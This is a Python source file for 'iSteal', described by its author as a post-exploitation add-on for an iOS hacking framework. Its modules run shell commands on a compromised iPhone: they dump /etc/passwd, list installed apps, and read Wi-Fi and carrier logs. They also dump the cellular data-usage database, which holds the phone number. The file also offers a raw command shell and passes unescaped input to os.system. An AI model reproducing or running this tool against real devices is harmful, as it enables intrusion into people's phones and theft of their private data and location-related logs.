try:
    import os
    import socket
    import platform
    import subprocess
except:
    print("Make sure to install the required modules!")


# iSteal - An extension made for post exploitation for the iPwn Framework.
# 05/24/21
# Made by 0x1CA3 | https://github.com/0x1CA3


def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
clear()

bannerz = """
.__  _________ __                .__   
|__|/   _____//  |_  ____ _____  |  |  
|  |\_____  \\   __\/ __ \\__  \ |  |  
|  |/        \|  | \  ___/ / __ \|  |__
|__/_______  /|__|  \___  >____  /____/
           \/           \/     \/      

An extension for post-exploitation for the iPwn framework.
Made by https://github.com/0x1CA3
Use 'help' or 'options' for commands.
"""

class commandz(object):
    commandz = \
        {
            "use modules/dump_etc_passwd": "cd / && cat etc/passwd",
            "use modules/list_installed_default_apps": "cd / && cd Applications && ls",
            "use modules/phone_build_and_version": "cd / && cd /System/Library/Accounts/AppleIDLoginPlugins/iCloudAppleIDLoginPlugin.bundle && cat Info.plist",
            "use modules/network/dump_wifi_logs": "cd / && cd /var/wireless/awdd/applogs/wifi && ls",
            "use modules/network/dump_carrier_logs": "cd / && cd /var/wireless/awdd/staging && ls",
            "use modules/network/dump_DataUsage_DB": "cd / && cd /var/wireless/Library/Databases && cat CellularUsage.db"
        }

def terminal():
    print("To return back to the main menu, use the 'back' command.")
    while True:
        terminalinput = input("\niSteal (terminal)\n  |===> ")
        if terminalinput == "back":
            clear()
            print(bannerz)
            mainshell()
        os.system("{}".format(terminalinput))

def mainshell():
    while True:
        maininput = input("\niSteal\n  |===> ")
        if maininput == "help" or maininput == "options":
            print(''' 
            Commands              Description
            --------              -----------
            help                  Displays available commands.
            list                  Lists all modules for post-exploitation.
            use [specific/module] Loads a module that you choose against the iOS device. Example: use modules/dump_etc_passwd
            command               Execute an OS command.
            banner                Reloads the banner.
            clear                 Clears the screen.
            exit                  Exits the framework.
            ''')
        elif maininput == "list":
            print(''' 
            Modules                              Description
            -------                              -----------
            modules/dump_etc_passwd              Dumps etc/passwd.
            modules/list_installed_default_apps  Lists all the installed default/common applications.
            modules/phone_build_and_version      Lists information about the phone build and version, along with other things.
            modules/network/dump_wifi_logs       Dumps Wi-Fi log files and gives you the option to read them.
            modules/network/dump_carrier_logs    Dumps the phone carrier log files and gives you the option to read them. [IP logs included]
            modules/network/dump_DataUsage_DB    Dumps the DB containing the iOS device's data usage and phone number.
            ''')
        elif maininput == "clear":
            clear()
        elif maininput == "banner":
            clear()
            print(bannerz)
        elif maininput == "exit":
            exit()
        elif maininput == "command":
            terminal()
        elif maininput == "use modules/dump_etc_passwd":
            subprocess.call(commandz.commandz["use modules/dump_etc_passwd"], shell=True)
        elif maininput == "use modules/list_installed_default_apps":
            subprocess.call(commandz.commandz["use modules/list_installed_default_apps"], shell=True)
        elif maininput == "use modules/phone_build_and_version":
            subprocess.call(commandz.commandz["use modules/phone_build_and_version"], shell=True)
        elif maininput == "use modules/network/dump_wifi_logs":
            subprocess.call(commandz.commandz["use modules/network/dump_wifi_logs"], shell=True)
            wifiloginput = input("\n[Pick a file to dump contents from. Example: example.consolidated.metriclog]\n  |===> ")    
            os.system("cd / && cd /var/wireless/awdd/applogs/wifi && cat {}".format(wifiloginput))
        elif maininput == "use modules/network/dump_carrier_logs":
            subprocess.call(commandz.commandz["use modules/network/dump_carrier_logs"], shell=True)
            isploginput = input("\n[Pick a file to dump contents from. Example: example.consolidated.metriclog]\n  |===> ")
            os.system("cd / && cd /var/wireless/awdd/staging && cat {}".format(isploginput))
        elif maininput == "use modules/network/dump_DataUsage_DB":
            subprocess.call(commandz.commandz["use modules/network/dump_DataUsage_DB"], shell=True)
        else:
            print(f"Command [{maininput}] was not found.")
print(bannerz)
mainshell()

# subprocess.call(commandz.commandz[""], shell=True)
# added this as a comment so i can add more modules l8er
# :)